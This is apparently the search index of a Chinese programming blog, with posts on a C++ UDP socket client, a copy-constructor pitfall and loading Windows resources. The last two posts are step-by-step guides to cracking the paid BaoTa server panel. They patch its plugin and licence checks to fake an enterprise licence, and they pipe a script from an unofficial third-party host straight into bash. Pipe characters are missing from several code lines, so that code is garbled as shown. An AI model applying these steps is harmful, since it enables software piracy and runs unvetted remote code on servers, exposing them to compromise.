class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_UPDATE_UI WM_USER + 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// 初始化套接字库</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initialization</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    WORD w_req = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//版本号</span></span><br><span class="line">    WSADATA wsadata;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(w_req, &amp;wsadata);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;初始化套接字库成功！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检测版本号</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span>  <span class="built_in">HIBYTE</span>(wsadata.wHighVersion) != <span class="number">2</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本号不符！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;套接字库版本正确！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//填充服务端地址信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多线程处理服务器返回消息</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">RecvSockMessage</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 类中调用多线程的时候将类传入函数</span></span><br><span class="line">    CClientDlg* pThis = (CClientDlg*)lpParameter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sockaddr_in siClient = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(siClient);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="comment">// PACKAGE同服务端</span></span><br><span class="line">        PACKAGE pkgForm;</span><br><span class="line">        <span class="comment">// 接收服务端返回消息，若无返回则会阻塞</span></span><br><span class="line">        <span class="type">int</span> nRet = <span class="built_in">recvfrom</span>(pThis-&gt;m_socketClient, (<span class="type">char</span>*)&amp;pkgForm, <span class="built_in">sizeof</span>(PACKAGE), <span class="number">0</span>, (sockaddr*)&amp;siClient, &amp;nLen);</span><br><span class="line">        <span class="keyword">if</span> (nRet == <span class="number">0</span>  nRet == SOCKET_ERROR)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 线程安全的将每个封包传入类中的封包队列中</span></span><br><span class="line">        pThis-&gt;m_clsLock.<span class="built_in">Lock</span>();</span><br><span class="line">        pThis-&gt;m_lstPakToHandle.<span class="built_in">push_back</span>(pkgForm);</span><br><span class="line">        pThis-&gt;m_clsLock.<span class="built_in">Unlock</span>();</span><br><span class="line">        <span class="comment">// 发送用户自定义消息进行UI更新以及数据包处理</span></span><br><span class="line">        pThis-&gt;<span class="built_in">PostMessage</span>(WM_UPDATE_UI);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户自定义消息的处理函数</span></span><br><span class="line"><span class="function">afx_msg LRESULT <span class="title">CClientDlg::OnUpdateUI</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 线程安全获取封包</span></span><br><span class="line">    m_clsLock.<span class="built_in">Lock</span>();</span><br><span class="line">    <span class="keyword">auto</span> pkgForm = m_lstPakToHandle.<span class="built_in">front</span>();</span><br><span class="line">    <span class="comment">// 获取一个包将队列中的包去除一个</span></span><br><span class="line">    m_lstPakToHandle.<span class="built_in">pop_front</span>();</span><br><span class="line">    m_clsLock.<span class="built_in">Unlock</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// TODO 数据包分发函数进行处理</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在不通环境下将此段代码加入各自的初始化函数中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitSocket</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">initialization</span>();</span><br><span class="line">  <span class="comment">// 初始服务器数据</span></span><br><span class="line">    m_serverInfo.m_wPort = <span class="built_in">htons</span>(<span class="number">0x9527</span>); <span class="comment">// 服务器端口</span></span><br><span class="line">    m_serverInfo.m_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>); <span class="comment">// 服务器IP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    <span class="comment">// m_socketClient 为全局或类中成员，类型为SOCKET</span></span><br><span class="line">    m_socketClient = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span> (m_socketClient == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">AfxMessageBox</span>(<span class="string">&quot;程序异常，请检查软件权限&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启动收数据线程</span></span><br><span class="line">    m_hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, RecvSockMessage, <span class="keyword">this</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (m_hThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">AfxMessageBox</span>(<span class="string">&quot;程序异常 \r\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 当客户端发送一次封包后，可以使用如下代码获取客户端的本地端口</span></span><br><span class="line">    sockaddr_in si;</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(si);</span><br><span class="line">    <span class="built_in">getsockname</span>(m_socketClient, (sockaddr*)&amp;si, &amp;nLen);</span><br><span class="line">    m_localUserInfo.m_wPort = si.sin_port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 发送自己的数据包，比如登录包</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>拷贝构造注意事项</title>
      <link href="/79cb50dd447c/"/>
      <url>/79cb50dd447c/</url>
      
        <content type="html"><![CDATA[<p>当一个类中含有指针时，如下面的CFoo类<strong>（在拷贝构造中包含清空自身的方法）</strong>，对他进行方法传参的拷贝构造，会出现this指针的类对象内指针的地址不是null值。从而导致对野指针进行析构而导致出现严重bug，改为传递指针调用即可避免拷贝构造解决该问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CFoo</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CFoo</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        m_pRoot = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">CFoo</span>()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CFoo</span>(<span class="type">const</span> CFoo&amp; obj)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (&amp;obj == <span class="keyword">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 调用Clear()时会出现m_pRoot 不是null值对野指针进行析构</span></span><br><span class="line">        m_pRoot = obj.m_pRoot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string* m_pRoot;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">(CFoo obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test1</span><span class="params">(CFoo* obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CFoo foo;</span><br><span class="line">  <span class="built_in">Test</span>(foo); <span class="comment">// 出大问题</span></span><br><span class="line">    </span><br><span class="line">    CFoo* pFoo = <span class="keyword">new</span> <span class="built_in">CFoo</span>();</span><br><span class="line">    <span class="built_in">Test1</span>(pFoo); <span class="comment">// 避免拷贝构造，达到目的</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>加载资源文件到内存中</title>
      <link href="/2edfb3967403/"/>
      <url>/2edfb3967403/</url>
      
        <content type="html"><![CDATA[<p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDR_DRIVER_ZIP 资源文件ID</span></span><br><span class="line"><span class="comment">// &quot;DRIVER_ZIP&quot; 资源文件名称</span></span><br><span class="line">HRSRC hRsrc = <span class="built_in">FindResource</span>(<span class="built_in">GetModuleHandle</span>(<span class="number">0</span>), <span class="built_in">MAKEINTRESOURCE</span>(IDR_DRIVER_ZIP), <span class="string">&quot;DRIVER_ZIP&quot;</span>);</span><br><span class="line">HGLOBAL resource = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line"><span class="comment">// 资源大小</span></span><br><span class="line">DWORD size = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++写出资源文件</title>
      <link href="/852e79a34e4b/"/>
      <url>/852e79a34e4b/</url>
      
        <content type="html"><![CDATA[<p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提取资源文件</span></span><br><span class="line"><span class="function">BOOL <span class="title">ExtraceResourceFile</span><span class="params">(<span class="type">uint16_t</span> resource_id, <span class="type">const</span> TCHAR* output_file, TCHAR* type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hFilemap = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        HINSTANCE hInstance = ::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>);</span><br><span class="line">        HRSRC hResource = <span class="built_in">FindResource</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(resource_id), type);</span><br><span class="line">        <span class="keyword">if</span> (hResource == <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HGLOBAL hFileResource = <span class="built_in">LoadResource</span>(<span class="literal">nullptr</span>, hResource);</span><br><span class="line">        <span class="keyword">if</span> (hFileResource == <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LPVOID lpFile = <span class="built_in">LockResource</span>(hFileResource);</span><br><span class="line">        <span class="keyword">if</span> (lpFile == <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> dwSize = <span class="built_in">SizeofResource</span>(<span class="literal">nullptr</span>, hResource);</span><br><span class="line">        <span class="keyword">if</span> (dwSize &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hFile = <span class="built_in">CreateFile</span>((LPCSTR)output_file, GENERIC_READ  GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HANDLE hFilemap = <span class="built_in">CreateFileMapping</span>(hFile, <span class="literal">nullptr</span>, PAGE_READWRITE, <span class="number">0</span>, dwSize, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">if</span> (hFilemap == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LPVOID lpBaseAddress = <span class="built_in">MapViewOfFile</span>(hFilemap, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (lpBaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">CopyMemory</span>(lpBaseAddress, lpFile, dwSize);</span><br><span class="line">        <span class="built_in">UnmapViewOfFile</span>(lpBaseAddress);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFilemap != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFilemap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE &amp;&amp; hFile != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写出资源文件</span></span><br><span class="line"><span class="built_in">ExtraceResourceFile</span>(IDR_AIR21, strAir2DllPath.<span class="built_in">GetString</span>(), <span class="string">&quot;AIR2&quot;</span>);</span><br></pre></td></tr></table></figure><p>资源如图所示存放：<br><img src="/../uploads/2021/10/3833921881.png" alt="kv24ffk4.png" title="kv24ffk4.png"></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宝塔插件破解方式</title>
      <link href="/103fc75e0ca6/"/>
      <url>/103fc75e0ca6/</url>
      
        <content type="html"><![CDATA[<p>进入目录 <code>/www/server/panel/class</code> 中，编辑文件 <code>panelPlugin.py</code><br>找到如下代码处</p><p><img src="/../uploads/2021/10/3007902457.png" alt="kuf7en83.png" title="kuf7en83.png"></p><p>在 <code>336行</code> 添加如下代码。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> softInfo <span class="keyword">in</span> softList[<span class="string">&#x27;list&#x27;</span>]:</span><br><span class="line">    softInfo[<span class="string">&#x27;endtime&#x27;</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>最终显示如下图所示。</p><p><img src="/../uploads/2021/10/623255557.png" alt="kuf7n3id.png" title="kuf7n3id.png"></p><p>效果如图所示</p><p><img src="/../uploads/2021/10/3326561622.png" alt="kuf7nmro.png" title="kuf7nmro.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宝塔企业版破解方式</title>
      <link href="/3e7c445b3e9c/"/>
      <url>/3e7c445b3e9c/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>首先更新宝塔为专业版</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.fenhao.me/ltd/install/update6.shbash</span><br></pre></td></tr></table></figure><h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>进入目录 <code>/www/server/panel/class</code> 编辑文件 <code>panelAuth.py</code>。<br>定位到如下图代码位置</p><p><img src="/../uploads/2021/10/201026272.png" alt="kuf76d2w.png" title="kuf76d2w.png"></p><p>找到下列代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = self.send_cloud_pro(<span class="string">&#x27;get_order_status&#x27;</span>, params)</span><br></pre></td></tr></table></figure><p>将其修改为如下代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span> : <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span> : &#123;<span class="string">&#x27;endtime&#x27;</span> : <span class="number">32503651199</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><ol><li>进入目录 <code>/www/server/panel/data</code> 中，新建一个文件，文件名为：<code>userInfo.json</code> ，内容为空。</li><li>如果已经存在这个文件，，删掉，重新新建文件</li><li>最后重启面板即可完成企业版破解</li></ol><h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="/../uploads/2021/10/2910957354.png" alt="kuf7ovoz.png" title="kuf7ovoz.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
